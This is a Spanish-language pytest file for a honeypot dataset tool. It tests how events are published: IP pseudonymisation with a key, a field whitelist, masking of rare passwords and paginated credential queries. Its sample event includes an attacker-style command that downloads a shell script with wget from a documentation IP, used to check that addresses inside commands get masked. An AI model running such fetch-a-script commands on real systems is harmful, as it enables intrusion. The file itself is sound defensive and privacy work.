"""La edición publicable del corpus: qué entra, cómo se seudonimiza y qué se tapa."""

from __future__ import annotations

import hashlib
from typing import Any

import pytest

from honeyml import publicacion
from honeyml.api import privacidad

CLAVE = b"k" * 32

EVENTO = {
    "@timestamp": "2026-08-20T10:00:00Z",
    "honeypot": "cowrie",
    "event": {"category": "authentication", "action": "login", "outcome": "failure"},
    "source": {
        "ip": "203.0.113.7",
        "port": 51234,
        "domain": "host.ejemplo.test",
        "geo": {
            "country_name": "Argentina",
            "country_iso_code": "AR",
            "city_name": "Una ciudad",
            "location": {"lat": -34.6, "lon": -58.4},
        },
        "as": {"number": 64500, "organization": {"name": "Red de prueba"}},
    },
    "destination": {"ip": "198.51.100.1", "port": 22},
    "user": {"name": "root"},
    "related": {"user": ["cuenta.puntual"], "ip": ["203.0.113.7"]},
    "cowrie": {"password": "unica", "session": "abc123"},
    "message": "login attempt [root/unica] failed",
    "process": {"command_line": "wget http://198.51.100.9/x.sh"},
}


def test_sin_clave_no_arranca(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv(publicacion.VARIABLE_DE_CLAVE, raising=False)
    with pytest.raises(publicacion.ClaveAusenteError):
        publicacion.clave_del_entorno()
    monkeypatch.setenv(publicacion.VARIABLE_DE_CLAVE, "corta")
    with pytest.raises(publicacion.ClaveAusenteError):
        publicacion.clave_del_entorno()


def test_el_seudonimo_es_estable_y_depende_de_la_clave() -> None:
    uno = publicacion.seudonimo("203.0.113.7", CLAVE)
    assert uno == publicacion.seudonimo("203.0.113.7", CLAVE)
    assert uno != publicacion.seudonimo("203.0.113.8", CLAVE)
    assert uno != publicacion.seudonimo("203.0.113.7", b"otra" * 8)
    # Sin la clave no se reconstruye: no es el hash pelado de la dirección.
    assert hashlib.sha256(b"203.0.113.7").hexdigest()[:16] not in uno


def test_un_evento_sale_con_la_lista_blanca_y_las_reglas() -> None:
    publico = publicacion.documento_publico(EVENTO, CLAVE, usuarios={"root"}, contrasenas=set())

    assert publico[publicacion.SEUDONIMO] == publicacion.seudonimo("203.0.113.7", CLAVE)
    assert "source.ip" not in publico
    # Lo que no está en la lista blanca no sale, aunque esté en el índice.
    for afuera in (
        "destination.ip",
        "message",
        "related.user",
        "related.ip",
        "source.domain",
        "source.geo.city_name",
        "source.geo.location.lat",
    ):
        assert afuera not in publico
    assert publico["source.geo.country_iso_code"] == "AR"
    assert publico["destination.port"] == 22
    # Credenciales: el usuario de diccionario queda, la contraseña poco probada se tapa.
    assert publico["user.name"] == "root"
    assert publico["cowrie.password"] == privacidad.CREDENCIAL_TAPADA
    # Las direcciones dentro de un comando se tapan.
    assert publico["process.command_line"] == "wget http://tapado/x.sh"


def test_las_credenciales_se_recorren_de_a_paginas(monkeypatch: pytest.MonkeyPatch) -> None:
    paginas: list[dict[str, Any]] = [
        {
            "buckets": [
                {"key": {"v": "root"}, "doc_count": 900, "origenes": {"value": 300}},
                {"key": {"v": "rara"}, "doc_count": 2, "origenes": {"value": 1}},
            ],
            "after_key": {"v": "rara"},
        },
        {
            "buckets": [{"key": {"v": "admin"}, "doc_count": 50, "origenes": {"value": 9}}],
            "after_key": {"v": "admin"},
        },
        {"buckets": []},
    ]
    pedidos: list[dict[str, Any]] = []

    def falso(body: dict[str, Any], es_url: str = "") -> dict[str, Any]:
        pedidos.append(body)
        return {"aggregations": {"c": paginas[len(pedidos) - 1]}}

    monkeypatch.setattr(publicacion.queries, "_search", falso)
    quedan = publicacion.credenciales_que_quedan(
        "cowrie.password", publicacion.consulta(None, None)
    )
    assert quedan == {"root", "admin"}
    assert len(pedidos) == 3
    # La segunda página arranca donde terminó la primera.
    assert pedidos[1]["aggs"]["c"]["composite"]["after"] == {"v": "rara"}


def test_la_ventana_excluye_los_origenes_internos() -> None:
    cuerpo = publicacion.consulta("2026-05-30", "2026-10-03T22:00:59Z")
    assert cuerpo["bool"]["must_not"] == publicacion.redes.TERMINOS
    assert cuerpo["bool"]["filter"] == [
        {"range": {"@timestamp": {"gte": "2026-05-30", "lte": "2026-10-03T22:00:59Z"}}}
    ]
